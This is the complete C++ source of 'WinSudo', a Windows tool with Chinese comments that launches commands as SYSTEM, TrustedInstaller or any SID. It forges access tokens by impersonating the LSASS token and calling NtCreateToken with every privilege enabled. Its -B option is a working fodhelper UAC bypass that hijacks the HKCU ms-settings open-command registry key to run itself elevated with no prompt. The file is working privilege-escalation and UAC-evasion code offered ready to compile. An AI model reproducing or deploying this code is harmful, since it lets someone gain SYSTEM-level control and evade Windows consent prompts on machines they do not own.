/* 
compile commandline: 
g++ WinSudo.cpp -lWtsApi32 -lUserenv -lntdll -ladvapi32 -static -o WinSudo.exe
*/

#include <Windows.h>
#include <WtsApi32.h>
#include <Userenv.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <stdarg.h>
#include <string>
#include <vector>
#include <sddl.h>

// ==========================================
// 全局配置
// ==========================================

bool g_bDebug = false;

// ==========================================
// 日志系统
// ==========================================

void WriteToStdOut(const char* str) {
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    if (hOut == INVALID_HANDLE_VALUE || hOut == NULL) return;
    DWORD written;
    if (!WriteConsoleA(hOut, str, strlen(str), &written, NULL)) {
        WriteFile(hOut, str, strlen(str), &written, NULL);
    }
}

enum LogLevel { LOG_ERROR, LOG_WARN, LOG_INFO, LOG_SUCCESS, LOG_DEBUG };

void Log(LogLevel level, const char* format, ...) {
    // ★ 修复：非调试模式只显示 ERROR 和 WARN
    if (!g_bDebug && level != LOG_ERROR && level != LOG_WARN) return;
    
    const char* prefix = "";
    HANDLE hOut = GetStdHandle(STD_OUTPUT_HANDLE);
    CONSOLE_SCREEN_BUFFER_INFO csbi;
    WORD wOldColor = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_BLUE;
    if (GetConsoleScreenBufferInfo(hOut, &csbi)) {
        wOldColor = csbi.wAttributes;
    }
    WORD wColor = wOldColor;
    
    switch (level) {
        case LOG_ERROR:   prefix = "[!] "; wColor = FOREGROUND_RED | FOREGROUND_INTENSITY; break;
        case LOG_WARN:    prefix = "[-] "; wColor = FOREGROUND_RED | FOREGROUND_GREEN | FOREGROUND_INTENSITY; break;
        case LOG_INFO:    prefix = "[*] "; wColor = FOREGROUND_BLUE | FOREGROUND_GREEN | FOREGROUND_INTENSITY; break;
        case LOG_SUCCESS: prefix = "[+] "; wColor = FOREGROUND_GREEN | FOREGROUND_INTENSITY; break;
        case LOG_DEBUG:   prefix = "[D] "; wColor = FOREGROUND_INTENSITY; break;
    }
    
    SetConsoleTextAttribute(hOut, wColor);
    WriteToStdOut(prefix);
    
    char buffer[4096];
    va_list args;
    va_start(args, format);
    vsnprintf(buffer, sizeof(buffer), format, args);
    va_end(args);
    WriteToStdOut(buffer);
    WriteToStdOut("\r\n");
    
    SetConsoleTextAttribute(hOut, wOldColor);
}

// ==========================================
// NT API 定义
// ==========================================

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

#ifndef SE_GROUP_INTEGRITY
#define SE_GROUP_INTEGRITY (0x00000020L)
#endif
#ifndef SE_GROUP_INTEGRITY_ENABLED
#define SE_GROUP_INTEGRITY_ENABLED (0x00000040L)
#endif

typedef struct _MY_OBJECT_ATTRIBUTES {
    ULONG  Length;
    HANDLE RootDirectory;
    PVOID  ObjectName;
    ULONG  Attributes;
    PVOID  SecurityDescriptor;
    PVOID  SecurityQualityOfService;
} MY_OBJECT_ATTRIBUTES;

typedef struct _TOKEN_SOURCE_CUSTOM {
    CHAR SourceName[8];
    LUID SourceIdentifier;
} TOKEN_SOURCE_CUSTOM;

typedef NTSTATUS(NTAPI* PNtCreateToken)(
    PHANDLE, ACCESS_MASK, PVOID, TOKEN_TYPE, PLUID, PLARGE_INTEGER,
    PTOKEN_USER, PTOKEN_GROUPS, PTOKEN_PRIVILEGES, PTOKEN_OWNER,
    PTOKEN_PRIMARY_GROUP, PTOKEN_DEFAULT_DACL, PVOID);

// ==========================================
// 辅助工具函数
// ==========================================

void ShowUsage(const char* prog) {
    printf("\n");
    printf("WinSudo v3.3 - 以任意身份运行程序\n");
    printf("================================\n\n");
    printf("用法: %s [选项] <命令>\n\n", prog);
    printf("身份选项:\n");
    printf("  -U:<名称|SID>     指定运行身份 (默认: System)\n");
    printf("                    快捷方式: S/System, A/Admin, TI/TrustedInstaller\n\n");
    printf("令牌选项:\n");
    printf("  -G:<组名>         向令牌添加额外的组 (含空格需加引号)\n");
    printf("  -P                启用令牌中的所有特权\n\n");
    printf("运行选项:\n");
    printf("  -i                内联模式 (在当前控制台运行)\n");
    printf("  -B                使用 UAC Bypass 方式提权\n");
    printf("  -D                显示调试信息\n");
    printf("  -h, --help, /?    显示此帮助\n\n");
    printf("示例:\n");
    printf("  %s -U:S cmd.exe                          以 SYSTEM 身份运行\n", prog);
    printf("  %s -U:TI -P -i cmd.exe                   以 TI 身份内联运行\n", prog);
    printf("  %s -U:S -G:\"CONSOLE LOGON\" cmd.exe       添加控制台登录组\n", prog);
    printf("  %s -B -U:S cmd.exe                       使用 bypass 方式\n", prog);
    printf("  %s -U:S cmd /k echo \"hello world\"        运行带参数的命令\n", prog);
}

// ★ 获取命令行中跳过程序名后的参数部分
const char* SkipProgramName(const char* cmdLine) {
    if (!cmdLine) return "";
    
    // 跳过程序名
    if (*cmdLine == '"') {
        cmdLine++;
        while (*cmdLine && *cmdLine != '"') cmdLine++;
        if (*cmdLine == '"') cmdLine++;
    } else {
        while (*cmdLine && *cmdLine != ' ' && *cmdLine != '\t') cmdLine++;
    }
    
    // 跳过空格
    while (*cmdLine == ' ' || *cmdLine == '\t') cmdLine++;
    
    return cmdLine;
}

BOOL IsUserAnAdmin() {
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;
    BOOL b = AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID, 
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &AdministratorsGroup);
    if (b) { 
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &b)) b = FALSE; 
        FreeSid(AdministratorsGroup); 
    }
    return b;
}

DWORD GetActiveSessionID() {
    DWORD count = 0; 
    PWTS_SESSION_INFOA pSessionInfo = NULL; 
    DWORD activeSessionId = (DWORD)-1;
    if (WTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessionInfo, &count)) {
        for (DWORD i = 0; i < count; ++i) { 
            if (pSessionInfo[i].State == WTSActive) { 
                activeSessionId = pSessionInfo[i].SessionId; 
                break; 
            } 
        }
        WTSFreeMemory(pSessionInfo);
    }
    if (activeSessionId == (DWORD)-1) 
        ProcessIdToSessionId(GetCurrentProcessId(), &activeSessionId);
    return activeSessionId;
}

BOOL EnablePrivilege(HANDLE hToken, LPCSTR privilegeName) {
    HANDLE hTokenToUse = hToken;
    BOOL bMyToken = FALSE;
    if (hTokenToUse == NULL) {
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hTokenToUse)) 
            return FALSE;
        bMyToken = TRUE;
    }
    LUID luid;
    if (!LookupPrivilegeValueA(NULL, privilegeName, &luid)) {
        if (bMyToken) CloseHandle(hTokenToUse);
        return FALSE;
    }
    TOKEN_PRIVILEGES tp = { 1, {{ luid, SE_PRIVILEGE_ENABLED }} };
    BOOL r = AdjustTokenPrivileges(hTokenToUse, FALSE, &tp, sizeof(tp), NULL, NULL);
    DWORD err = GetLastError();
    if (bMyToken) CloseHandle(hTokenToUse);
    return r && (err == ERROR_SUCCESS);
}

void EnableAllPrivileges(HANDLE hToken) {
    DWORD dwSize = 0; 
    GetTokenInformation(hToken, TokenPrivileges, NULL, 0, &dwSize);
    if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) return;
    std::vector<BYTE> buffer(dwSize); 
    PTOKEN_PRIVILEGES pPrivs = (PTOKEN_PRIVILEGES)buffer.data();
    if (GetTokenInformation(hToken, TokenPrivileges, pPrivs, dwSize, &dwSize)) {
        for (DWORD i = 0; i < pPrivs->PrivilegeCount; i++) 
            pPrivs->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED;
        AdjustTokenPrivileges(hToken, FALSE, pPrivs, 0, NULL, NULL);
        Log(LOG_DEBUG, "已启用 %d 个特权", pPrivs->PrivilegeCount);
    }
}

DWORD GetPidByNameA(LPCSTR processName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32 pe = { sizeof(pe) };
        if (Process32First(hSnapshot, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, processName) == 0) {
                    pid = pe.th32ProcessID;
                    break;
                }
            } while (Process32Next(hSnapshot, &pe));
        }
        CloseHandle(hSnapshot);
    }
    return pid;
}

PSID DupSid(PSID src) {
    if (!src) return NULL;
    DWORD len = GetLengthSid(src);
    PSID dst = (PSID)HeapAlloc(GetProcessHeap(), 0, len);
    if (dst) CopySid(len, dst, src);
    return dst;
}

PSID GetSidFromString(LPCSTR str) {
    PSID sid = NULL;
    if (ConvertStringSidToSidA(str, &sid)) {
        PSID dup = DupSid(sid);
        LocalFree(sid);
        return dup;
    }
    return NULL;
}

PSID GetSidForAccountName(LPCSTR accountName) {
    DWORD sidLen = 0, domainLen = 0;
    SID_NAME_USE use;
    LookupAccountNameA(NULL, accountName, NULL, &sidLen, NULL, &domainLen, &use);
    if (sidLen > 0) {
        PSID sid = (PSID)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sidLen);
        char* domain = (char*)HeapAlloc(GetProcessHeap(), 0, domainLen);
        if (sid && domain && LookupAccountNameA(NULL, accountName, sid, &sidLen, domain, &domainLen, &use)) {
            HeapFree(GetProcessHeap(), 0, domain);
            return sid;
        }
        if (domain) HeapFree(GetProcessHeap(), 0, domain);
        if (sid) HeapFree(GetProcessHeap(), 0, sid);
    }
    return NULL;
}

PSID ResolveIdentity(const char* identityStr) {
    if (_stricmp(identityStr, "S") == 0 || _stricmp(identityStr, "System") == 0) {
        Log(LOG_DEBUG, "映射: %s -> SYSTEM", identityStr);
        return GetSidFromString("S-1-5-18");
    }
    if (_stricmp(identityStr, "A") == 0 || _stricmp(identityStr, "Admin") == 0) {
        Log(LOG_DEBUG, "映射: %s -> Administrators", identityStr);
        return GetSidFromString("S-1-5-32-544");
    }
    if (_stricmp(identityStr, "TI") == 0 || _stricmp(identityStr, "TrustedInstaller") == 0) {
        Log(LOG_DEBUG, "映射: %s -> TrustedInstaller", identityStr);
        return GetSidForAccountName("NT SERVICE\\TrustedInstaller");
    }
    PSID sid = GetSidFromString(identityStr);
    if (sid) return sid;
    return GetSidForAccountName(identityStr);
}

PSID GetLogonSid() {
    HANDLE h;
    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h)) return NULL;
    DWORD l = 0;
    GetTokenInformation(h, TokenGroups, 0, 0, &l);
    std::vector<BYTE> b(l);
    GetTokenInformation(h, TokenGroups, b.data(), l, &l);
    CloseHandle(h);
    
    PTOKEN_GROUPS g = (PTOKEN_GROUPS)b.data();
    for (DWORD i = 0; i < g->GroupCount; i++) {
        if ((g->Groups[i].Attributes & SE_GROUP_LOGON_ID) == SE_GROUP_LOGON_ID) {
            return DupSid(g->Groups[i].Sid);
        }
    }
    return NULL;
}

void TerminateParent(int parentPid, DWORD exitCode) {
    if (parentPid > 0) {
        HANDLE hParent = OpenProcess(PROCESS_TERMINATE, FALSE, (DWORD)parentPid);
        if (hParent) {
            TerminateProcess(hParent, exitCode);
            CloseHandle(hParent);
        }
    }
}

// ==========================================
// 核心：自定义令牌生成器
// ==========================================

HANDLE CreateCustomToken(DWORD targetSessionId, PSID pUserSid, const std::vector<std::string>& extraGroups) {
    Log(LOG_DEBUG, "CreateCustomToken: Session=%d", targetSessionId);

    PNtCreateToken NtCreateToken = (PNtCreateToken)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtCreateToken");
    if (!NtCreateToken) { 
        Log(LOG_ERROR, "无法获取 NtCreateToken"); 
        return NULL; 
    }

    if (!pUserSid || !IsValidSid(pUserSid)) {
        Log(LOG_ERROR, "无效的用户 SID");
        return NULL;
    }

    LPSTR sidStr = NULL;
    ConvertSidToStringSidA(pUserSid, &sidStr);
    Log(LOG_INFO, "目标身份: %s", sidStr ? sidStr : "unknown");
    if (sidStr) LocalFree(sidStr);

    EnablePrivilege(NULL, "SeDebugPrivilege");

    PSID pSidSystem = GetSidFromString("S-1-5-18");
    PSID pSidAdmins = GetSidFromString("S-1-5-32-544");
    PSID pSidAuth = GetSidFromString("S-1-5-11");
    PSID pSidEveryone = GetSidFromString("S-1-1-0");
    PSID pSidAllSvcs = GetSidFromString("S-1-5-80-0");
    PSID pSidTI = GetSidForAccountName("NT SERVICE\\TrustedInstaller");
    PSID pSidIntegrity = GetSidFromString("S-1-16-16384");
    PSID pLogonSid = GetLogonSid();

    DWORD lsassPid = GetPidByNameA("lsass.exe");
    if (lsassPid == 0) { 
        Log(LOG_ERROR, "未找到 lsass.exe"); 
        return NULL; 
    }

    Log(LOG_DEBUG, "打开 LSASS (PID: %d)...", lsassPid);
    HANDLE hLsassProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
    if (!hLsassProc) {
        Log(LOG_ERROR, "无法打开 LSASS: %d", GetLastError());
        return NULL;
    }

    HANDLE hLsassToken = NULL;
    if (!OpenProcessToken(hLsassProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hLsassToken)) {
        Log(LOG_ERROR, "无法获取 LSASS 令牌: %d", GetLastError());
        CloseHandle(hLsassProc);
        return NULL;
    }

    if (!ImpersonateLoggedOnUser(hLsassToken)) {
        Log(LOG_ERROR, "模拟 LSASS 失败: %d", GetLastError());
        CloseHandle(hLsassToken);
        CloseHandle(hLsassProc);
        return NULL;
    }
    Log(LOG_DEBUG, "成功模拟 LSASS");

    HANDLE hThreadToken = NULL;
    OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hThreadToken);
    EnablePrivilege(hThreadToken, "SeCreateTokenPrivilege");
    EnablePrivilege(hThreadToken, "SeTcbPrivilege");
    EnablePrivilege(hThreadToken, "SeAssignPrimaryTokenPrivilege");
    CloseHandle(hThreadToken);

    std::vector<SID_AND_ATTRIBUTES> groups;
    groups.push_back({ pUserSid, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_OWNER });
    if (pLogonSid) groups.push_back({ pLogonSid, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_LOGON_ID });
    if (pSidSystem) groups.push_back({ pSidSystem, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY });
    if (pSidAdmins) groups.push_back({ pSidAdmins, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY });
    if (pSidAuth) groups.push_back({ pSidAuth, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY });
    if (pSidEveryone) groups.push_back({ pSidEveryone, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY });
    if (pSidIntegrity) groups.push_back({ pSidIntegrity, SE_GROUP_INTEGRITY | SE_GROUP_INTEGRITY_ENABLED });

    for (const auto& groupName : extraGroups) {
        PSID sid = GetSidFromString(groupName.c_str());
        if (!sid) sid = GetSidForAccountName(groupName.c_str());
        if (sid) {
            groups.push_back({ sid, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT });
            Log(LOG_DEBUG, "添加组: %s", groupName.c_str());
        } else {
            Log(LOG_WARN, "无法解析组: %s", groupName.c_str());
        }
    }

    DWORD groupsSize = sizeof(TOKEN_GROUPS) + groups.size() * sizeof(SID_AND_ATTRIBUTES);
    PTOKEN_GROUPS pGroups = (PTOKEN_GROUPS)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, groupsSize);
    pGroups->GroupCount = (DWORD)groups.size();
    for (size_t i = 0; i < groups.size(); i++) pGroups->Groups[i] = groups[i];

    DWORD privCount = 35;
    DWORD privSize = sizeof(TOKEN_PRIVILEGES) + privCount * sizeof(LUID_AND_ATTRIBUTES);
    PTOKEN_PRIVILEGES pPrivs = (PTOKEN_PRIVILEGES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, privSize);
    pPrivs->PrivilegeCount = privCount;
    for (DWORD i = 0; i < privCount; i++) {
        pPrivs->Privileges[i].Luid.LowPart = i + 2;
        pPrivs->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED | SE_PRIVILEGE_ENABLED_BY_DEFAULT;
    }

    TOKEN_USER tUser = { { pUserSid, 0 } };
    TOKEN_OWNER tOwner = { pUserSid };
    TOKEN_PRIMARY_GROUP tPrim = { pUserSid };
    TOKEN_SOURCE_CUSTOM tSource;
    memcpy(tSource.SourceName, "WINSUDO\0", 8);
    AllocateLocallyUniqueId(&tSource.SourceIdentifier);
    LUID authId = { 0x3e7, 0 };
    LARGE_INTEGER exp; exp.QuadPart = -1;
    MY_OBJECT_ATTRIBUTES oa = { sizeof(MY_OBJECT_ATTRIBUTES) };

    Log(LOG_DEBUG, "调用 NtCreateToken...");
    HANDLE hNewToken = NULL;
    NTSTATUS status = NtCreateToken(
        &hNewToken, TOKEN_ALL_ACCESS, &oa, TokenPrimary, &authId, &exp,
        &tUser, pGroups, pPrivs, &tOwner, &tPrim, NULL, &tSource);

    if (status != STATUS_SUCCESS) {
        Log(LOG_ERROR, "NtCreateToken 失败: 0x%08X", status);
        RevertToSelf();
        CloseHandle(hLsassToken);
        CloseHandle(hLsassProc);
        HeapFree(GetProcessHeap(), 0, pGroups);
        HeapFree(GetProcessHeap(), 0, pPrivs);
        return NULL;
    }

    Log(LOG_SUCCESS, "令牌创建成功");

    if (!SetTokenInformation(hNewToken, TokenSessionId, &targetSessionId, sizeof(DWORD))) {
        Log(LOG_WARN, "设置 SessionId 失败: %d", GetLastError());
    }

    RevertToSelf();
    CloseHandle(hLsassToken);
    CloseHandle(hLsassProc);
    HeapFree(GetProcessHeap(), 0, pGroups);
    HeapFree(GetProcessHeap(), 0, pPrivs);

    return hNewToken;
}

// ==========================================
// 主程序
// ==========================================

int main(int argc, char* argv[]) {
    // 帮助检测
    if (argc < 2 || strcmp(argv[1], "-h") == 0 || strcmp(argv[1], "--help") == 0 || strcmp(argv[1], "/?") == 0) {
        ShowUsage(argv[0]);
        return 0;
    }

    std::string identityStr = "S";
    bool bInline = false, bPriv = false, bBypass = false;
    std::vector<std::string> extraGroups;
    int argStart = argc;
    int ParentProcessId = 0;  // 0=未指定, >0=有父进程, <0=bypass非inline
    bool bCleanRegistry = false;

    // 参数解析
    int parseStart = 1;
    
    if (argc > 2 && strcmp(argv[1], "-pid") == 0) {
        ParentProcessId = atoi(argv[2]);
        parseStart = 4;
        if (argc > 3 && strcmp(argv[3], "-E") == 0) {
            bCleanRegistry = true;
            parseStart = 5;
        }
    }

    for (int i = parseStart; i < argc; i++) {
        if (_stricmp(argv[i], "-i") == 0 || _stricmp(argv[i], "--inline") == 0) {
            bInline = true;
        }
        else if (_stricmp(argv[i], "-p") == 0 || _stricmp(argv[i], "--Privileged") == 0) {
            bPriv = true;
        }
        else if (_stricmp(argv[i], "-D") == 0 || _stricmp(argv[i], "--debug") == 0) {
            g_bDebug = true;
        }
        else if (_stricmp(argv[i], "-B") == 0 || _stricmp(argv[i], "--Bypass") == 0) {
            bBypass = true;
        }
        else if (_strnicmp(argv[i], "-U:", 3) == 0) {
            std::string val = std::string(argv[i]).substr(3);
            if (val.empty()) { Log(LOG_ERROR, "-U 需要指定身份"); return 1; }
            identityStr = val;
        }
        else if (_strnicmp(argv[i], "-G:", 3) == 0) {
            std::string val = std::string(argv[i]).substr(3);
            if (val.empty()) { Log(LOG_ERROR, "-G 需要值"); return 1; }
            extraGroups.push_back(val);
        }
        else if (argv[i][0] == '-') {
            Log(LOG_ERROR, "未知选项: %s", argv[i]);
            return 1;
        }
        else {
            argStart = i;
            break;
        }
    }

    // ★ 修复2：构建命令行 - 直接拼接原始参数，保留引号
    std::string cmdLine;
    if (argStart < argc) {
        for(int i = argStart; i < argc; i++) {
            if(strlen(argv[i]) == 0 || strchr(argv[i], ' ') != NULL || strchr(argv[i], '\"') != NULL || strchr(argv[i], '\\') != NULL){
                cmdLine.push_back('\"');
                for(int j = 0; j < strlen(argv[i]); j++) {
                    if(argv[i][j] == '\"' || argv[i][j] == '\\')cmdLine.push_back('\\');
                    cmdLine.push_back(argv[i][j]);
                }
                cmdLine.push_back('\"');
                cmdLine.push_back(' ');
            } else {
                cmdLine += argv[i];
                cmdLine.push_back(' ');
            }
        }
        cmdLine.pop_back();
    } else {
        cmdLine = "cmd.exe";
    }

    if (bInline) {
        SetConsoleCtrlHandler(NULL, TRUE);
    }

    if (IsUserAnAdmin()) {
        // ==========================================
        // 已是管理员，执行核心逻辑
        // ==========================================
        
        // 清理注册表 (bypass 模式留下的)
        if (bCleanRegistry) {
            RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
            Log(LOG_DEBUG, "已清理 bypass 注册表项");
        }

        // ★ 修复1：无论是否 inline，都尝试 AttachConsole（用于显示调试信息）
        if (ParentProcessId > 0) {
            FreeConsole();
            if (!AttachConsole((DWORD)ParentProcessId)) {
                Log(LOG_DEBUG, "无法连接父控制台: %d", GetLastError());
                AllocConsole();
            } else {
                Log(LOG_DEBUG, "已连接到父控制台 (PID: %d)", ParentProcessId);
            }
        } else if (ParentProcessId < 0) {
            // bypass 非 inline 模式：ParentProcessId = -1
            FreeConsole();
            AllocConsole();
            Log(LOG_DEBUG, "Bypass 模式，创建新控制台");
        }
        // ParentProcessId == 0 时保持当前控制台

        DWORD sess = GetActiveSessionID();
        Log(LOG_DEBUG, "Session: %d, Inline: %s, ParentPID: %d", sess, bInline ? "true" : "false", ParentProcessId);

        PSID pTargetSid = ResolveIdentity(identityStr.c_str());
        if (!pTargetSid) {
            Log(LOG_ERROR, "无法解析身份: %s", identityStr.c_str());
            TerminateParent(ParentProcessId, 1);
            return 1;
        }

        HANDLE hToken = CreateCustomToken(sess, pTargetSid, extraGroups);
        if (!hToken) {
            Log(LOG_ERROR, "令牌创建失败");
            TerminateParent(ParentProcessId, 1);
            return 1;
        }

        if (bPriv) {
            EnableAllPrivileges(hToken);
            Log(LOG_INFO, "已启用所有特权 (-P)");
        }

        LPVOID lpEnv = NULL;
        CreateEnvironmentBlock(&lpEnv, hToken, FALSE);

        STARTUPINFOA si = { sizeof(si) };
        si.lpDesktop = (LPSTR)"winsta0\\default";
        
        DWORD dwFlags = CREATE_UNICODE_ENVIRONMENT;
        
        // inline 模式：不创建新控制台，继承当前
        // 非 inline 模式：创建新控制台
        if (!bInline) {
            dwFlags |= CREATE_NEW_CONSOLE;
            si.dwFlags = STARTF_USESHOWWINDOW;
            si.wShowWindow = SW_SHOWNORMAL;
        }

        PROCESS_INFORMATION pi = { 0 };

        Log(LOG_INFO, "启动: %s", cmdLine.c_str());
        Log(LOG_DEBUG, "Flags: 0x%X, Inherit: %s", dwFlags, bInline ? "TRUE" : "FALSE");

        BOOL success = CreateProcessAsUserA(
            hToken, 
            NULL, 
            (LPSTR)cmdLine.c_str(), 
            NULL, 
            NULL,
            bInline ? TRUE : FALSE,
            dwFlags, 
            lpEnv, 
            NULL, 
            &si, 
            &pi
        );

        if (success) {
            Log(LOG_SUCCESS, "进程已启动, PID: %lu", pi.dwProcessId);
            
            if (bInline) {
                WaitForSingleObject(pi.hProcess, INFINITE);
                DWORD exitCode = 0;
                GetExitCodeProcess(pi.hProcess, &exitCode);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                if (lpEnv) DestroyEnvironmentBlock(lpEnv);
                CloseHandle(hToken);
                TerminateParent(ParentProcessId, exitCode);
                ExitProcess(exitCode);
            } else {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
                if (lpEnv) DestroyEnvironmentBlock(lpEnv);
                CloseHandle(hToken);
                TerminateParent(ParentProcessId, 0);
                ExitProcess(0);
            }
        } else {
            DWORD err = GetLastError();
            Log(LOG_ERROR, "进程创建失败: %lu", err);
            if (lpEnv) DestroyEnvironmentBlock(lpEnv);
            CloseHandle(hToken);
            TerminateParent(ParentProcessId, 1);
            return 1;
        }

    } else if (bBypass) {
        // ==========================================
        // UAC Bypass 模式
        // ==========================================
        char selfPath[MAX_PATH];
        char cmdline[32768];
        
        GetModuleFileNameA(NULL, selfPath, MAX_PATH);
        
        sprintf(cmdline, "\"%s\" -pid %lu -E %s", selfPath, GetCurrentProcessId(), GetCommandLineA());
        
        RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
        
        HKEY hKey;
        RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command",
                        0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
        RegSetValueExA(hKey, NULL, 0, REG_SZ, (const BYTE*)cmdline, strlen(cmdline) + 1);
        RegSetValueExA(hKey, "DelegateExecute", 0, REG_SZ, (const BYTE*)"", 1);
        RegCloseKey(hKey);
        
        Log(LOG_DEBUG, "Bypass 命令: %s", cmdline);
        
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpFile = "fodhelper.exe";
        sei.nShow = SW_HIDE;
        
        Log(LOG_INFO, "UAC Bypass...");
        if (ShellExecuteExA(&sei)) {
            Sleep(INFINITE);
        } else {
            Log(LOG_ERROR, "Bypass 失败: %lu", GetLastError());
            RegDeleteTreeA(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");
            return 1;
        }

    } else {
        // ==========================================
        // 普通 UAC 提权
        // ==========================================
        char selfPath[MAX_PATH];
        char params[32768];
        
        GetModuleFileNameA(NULL, selfPath, MAX_PATH);
        
        // ★ 修复3：使用用户的提权逻辑
        sprintf(params, "-pid %lu %s", GetCurrentProcessId(), GetCommandLineA());
        
        Log(LOG_DEBUG, "提权参数: %s", params);
        
        SHELLEXECUTEINFOA sei = { sizeof(sei) };
        sei.lpVerb = "runas";
        sei.lpFile = selfPath;
        sei.lpParameters = params;
        sei.nShow = SW_HIDE;
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        
        Log(LOG_INFO, "请求管理员权限...");
        if (ShellExecuteExA(&sei)) {
            if (sei.hProcess) CloseHandle(sei.hProcess);
            Sleep(INFINITE);
        } else {
            Log(LOG_ERROR, "提权失败: %lu", GetLastError());
            return 1;
        }
    }

    return 0;
}